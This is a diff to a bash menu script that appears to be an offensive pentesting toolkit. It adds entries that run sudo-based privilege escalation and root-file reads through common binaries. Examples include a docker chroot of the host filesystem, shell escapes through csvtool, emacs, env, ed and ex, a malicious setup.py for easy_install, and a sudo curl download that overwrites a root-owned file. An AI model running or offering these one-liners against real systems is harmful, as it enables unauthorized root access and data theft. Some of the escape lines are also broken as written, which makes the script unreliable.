@@ -183,14 +183,20 @@ while true; do
 	echo -ne " 252. PrivEsc with c89\t\t\t\t\t253. PrivEsc with c99\t\t\t\t254. PrivEsc with capsh\n"
 	echo -ne " 255. PrivEsc with certbot\t\t\t\t256. PrivEsc with check_by_ssh\t\t\t257. Read a root's file with check_cups\n"
 	echo -ne " 258. PrivEsc with check_log\t\t\t\t259. Read a root's file with check_memory\t260. Read a root's file with check_raid\n"
-	echo -ne " 261. PrivEsc with check_ssl_cert\t\t\t242. PrivEsc with at\n"
+	echo -ne " 261. PrivEsc with check_ssl_cert\t\t\t242. PrivEsc with at\t\t\t\t284. Download a root's file with curl\n"
 	echo -ne " 262. Read a root's file with check_statusfile\t\t263. Set readable a root's file\t\t\t264. Set readable a root's file\n"
 	echo -ne " 265. PrivEsc with chroot method 2\t\t\t266. Read a root's file with cmp\t\t267. PrivEsc with cobc\n"
 	echo -ne " 268. Read a root's file with column\t\t\t269. Read a root's file with comm\t\t270. PrivEsc with composer\n"
 	echo -ne " 271. PrivEsc with cowsay\t\t\t\t272. PrivEsc with cowthink\t\t\t273. PrivEsc with cp\n"
 	echo -ne " 274. PrivEsc with cpan\t\t\t\t\t275. PrivEsc with cpio\t\t\t\t276. PrivEsc with cpulimit\n"
 	echo -ne " 277. PrivEsc with crash\t\t\t\t278. PrivEsc with crontab\t\t\t279. PrivEsc with csh\n"
-	echo -ne " 280. Clear PageCache, dEntries, Swap and iNodes\n"
+	echo -ne " 280. Clear PageCache, dEntries, Swap and iNodes\t281. Read a root's file with csplit\t\t282. PrivEsc with csvtool\n"
+	echo -ne " 283. Read a root's file with cupsfilter\t\t285. PrivEsc with dash\t\t\t\t286. Read a root's file with date\n"
+	echo -ne " 287. Read a root's file with dialog\t\t\t288. Read a root's file with dig\t\t289. PrivEsc with dmesg\n"
+	echo -ne " 290. PrivEsc with dmsetup\t\t\t\t291. PrivEsc with docker\t\t\t292. PrivEsc with easy_install\n"
+	echo -ne " 293. PrivEsc with eb\t\t\t\t\t294. PrivEsc with ed\t\t\t\t295. PrivEsc with emacs\n"
+	echo -ne " 296. PrivEsc with env\t\t\t\t\t297. Read a root's file with eqn\t\t298. PrivEsc with ex\n"
+	echo -ne " 299. Read a root's file with expand\n"
 	echo "WINRM"
 	echo -ne " 132. Alamot/code-snippets/winrm/\n"
 	echo "OTHERS"
@@ -1634,11 +1640,128 @@ while true; do
 		sudo crontab -e
 	;;
 	"279")
-		sudo chs
+		sudo csh
 	;;
 	"280")
 		sync; echo 3 > /proc/sys/vm/drop_caches
 		swapoff -a && swapon -a
+	;;
+	"281")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			csplit $LFILE 1
+			cat xx01
+		fi
+	;;
+	"282")
+		sudo csvtool call '/bin/sh;false' /etc/passwd
+	;;
+	"283")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo cupsfilter -i application/octet-stream -m application/octet-stream $LFILE
+		fi
+	;;
+	"284")
+		echo "Digit a root's file to download"
+		read -p "(example, http://127.0.0.1/root.txt)" URL
+		if [[ "$URL" != "" ]];
+		then
+			echo "Digit a root's file to write the downloaded file"
+			read -p "(example, root.txt)" LFILE
+			if [[ -f "$LFILE" ]];
+			then
+				sudo curl $URL -o $LFILE
+			fi
+		fi
+	;;
+	"285")
+		sudo dash
+	;;
+	"286")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo date -f $LFILE
+		fi
+	;;
+	"287")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo dialog --textbox "$LFILE" 0 0
+		fi
+	;;
+	"288")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo dig -f $LFILE
+		fi
+	;;
+	"289")
+		echo "!/bin/sh"
+		sudo dmesg -H
+		!/bin/sh
+	;;
+	"290")
+		echo "sudo dmsetup create base <<EOF"
+		echo "0 3534848 linear /dev/loop0 94208"
+		echo "EOF"
+		echo "sudo dmsetup ls --exec '/bin/sh -s'"
+		sudo dmsetup ls --exec '/bin/sh -s'
+	;;
+	"291")
+		sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+	;;
+	"292")
+		TF=$(mktemp -d)
+		echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
+		sudo easy_install $TF
+	;;
+	"293")
+		echo "!/bin/sh"
+		sudo eb logs
+		!/bin/sh
+	;;
+	"294")
+		echo "!/bin/sh"
+		sudo ed
+		!/bin/sh
+	;;
+	"295")
+		sudo emacs -Q -nw --eval '(term "/bin/sh")'
+	;;
+	"296")
+		sudo env /bin/sh
+	;;
+	"297")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo eqn "$LFILE"
+		fi
+	;;
+	"298")
+		echo "!/bin/sh"
+		sudo ex
+		!/bin/sh
+	;;
+	"299")
+		echo "Digit a root's file to read"
+		read -p "(example, root.txt)" LFILE
+		if [[ -f "$LFILE" ]];
+		then
+			sudo expand "$LFILE"
+		fi
 	;;
 	*)
 		echo "error, invalid choice"
